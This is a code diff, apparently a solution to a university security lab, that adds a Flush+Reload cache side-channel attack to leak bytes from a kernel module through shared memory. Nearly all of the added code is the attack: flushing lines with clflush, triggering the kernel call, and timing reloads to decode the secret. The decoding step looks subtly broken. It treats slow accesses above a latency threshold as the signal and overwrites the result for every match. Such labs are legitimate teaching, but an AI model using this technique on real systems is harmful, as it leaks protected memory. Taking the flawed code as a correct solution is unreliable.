@@ -51,6 +51,25 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Use "call_kernel_part1" to interact with the kernel module
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
+        size_t flush_offset;
+        uint64_t dram_latency;
+
+        //Flushing the memory here
+        for (flush_offset = 0; flush_offset < LAB2_SHARED_MEMORY_SIZE; flush_offset++) {
+            clflush(shared_memory+flush_offset);
+        }
+
+        //Use call kernel to access data
+        call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+        //Reload and measure time and Decode the transmission to get data
+        for (flush_offset = 0; flush_offset < LAB2_SHARED_MEMORY_SIZE ; flush_offset++) {
+            dram_latency = time_access((void*)(shared_memory+flush_offset));
+            if (dram_latency > 100){
+                leaked_byte = (char)(flush_offset / LAB2_PAGE_SIZE);
+                printf("\n This is the char we leaked %c", leaked_byte);
+            }
+        }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
